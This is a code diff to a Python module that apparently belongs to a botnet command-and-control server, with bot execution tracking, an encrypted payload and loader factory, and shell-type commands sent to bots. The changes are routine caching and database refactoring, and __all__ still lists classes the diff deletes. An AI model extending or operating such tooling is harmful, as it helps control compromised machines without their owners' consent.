@@ -204,7 +204,9 @@ class Model:
 
         with self._pool[0] as conn:
             cursor = conn.cursor()
-            for sql, params in pending:
+            for item in pending:
+                sql = item[0]
+                params = item[1] if len(item) > 1 else ()
                 try:
                     cursor.execute(sql, params)
                 except sqlite3.IntegrityError:
@@ -306,9 +308,11 @@ class Model:
             self._batch_writes.append(("INSERT INTO global_executed VALUES (?)",
                                        (bot_uid,)))
             self._batch_write_count += 1
-        # Auto-flush
-        if self._batch_write_count >= _DB_BATCH_COMMIT_INTERVAL:
-            self._commit_batch()
+        # Auto-flush immediately (critical for execution tracking)
+        self._commit_batch()
+        # Invalidate cache so next has_executed_global() reads fresh data
+        with self._cache_lock:
+            self._cache.pop(f"global:{bot_uid}", None)
 
     def has_executed_global(self, bot_uid: str):
         """Check if bot has executed global command. Uses cache first."""
@@ -467,8 +471,24 @@ class PayloadFactory:
     """
 
     def __init__(self):
-        self._payload_cache: Dict[str, str] = {}  # key -> encrypted_payload
+        self._payload_cache: Dict[str, tuple] = {}  # key -> (encrypted_payload, timestamp)
         self._cache_lock = RLock()
+
+    def _payload_cache_get(self, key: str):
+        """Return cached payload or None, checking TTL."""
+        with self._cache_lock:
+            entry = self._payload_cache.get(key)
+            if entry is not None and (time() - entry[1]) < _PAYLOAD_CACHE_TTL_SECONDS:
+                return entry[0]
+            elif entry is not None:
+                # Expired — remove
+                del self._payload_cache[key]
+            return None
+
+    def _payload_cache_set(self, key: str, value: str) -> None:
+        """Store encrypted payload with timestamp."""
+        with self._cache_lock:
+            self._payload_cache[key] = (value, time())
 
     @staticmethod
     def _openssl_encrypt(password: str, plaintext: str) -> str:
@@ -617,28 +637,6 @@ class PayloadFactory:
         return loader_content
 
 
-# --- Command and CommandType classes (moved here from cli.py) ---
-
-
-class Command:
-    """Represents a command to be executed on a bot."""
-
-    def __init__(self, command_type, command, options=None):
-        self.command_type = command_type
-        self.command = command
-        self.options = options or {}
-
-    def __repr__(self):
-        return f"Command(type={self.command_type}, cmd={self.command!r})"
-
-
-class CommandType:
-    """Enum-like class for command types (mimics IntEnum behavior)."""
-
-    SHELL = 1
-    MODULE = 2
-
-
 # Global singleton instance for lazy init (reduces import overhead)
 _model_instance: Optional["Model"] = None
 
@@ -651,5 +649,8 @@ def get_model() -> Model:
     return _model_instance
 
 
-__all__ = ["Command", "CommandType", "RequestType", "Model", "Bot",
+# Backward compatibility alias
+OptimizedModel = Model
+
+__all__ = ["Command", "CommandType", "RequestType", "Model", "OptimizedModel", "Bot",
            "PayloadFactory", "get_model"]
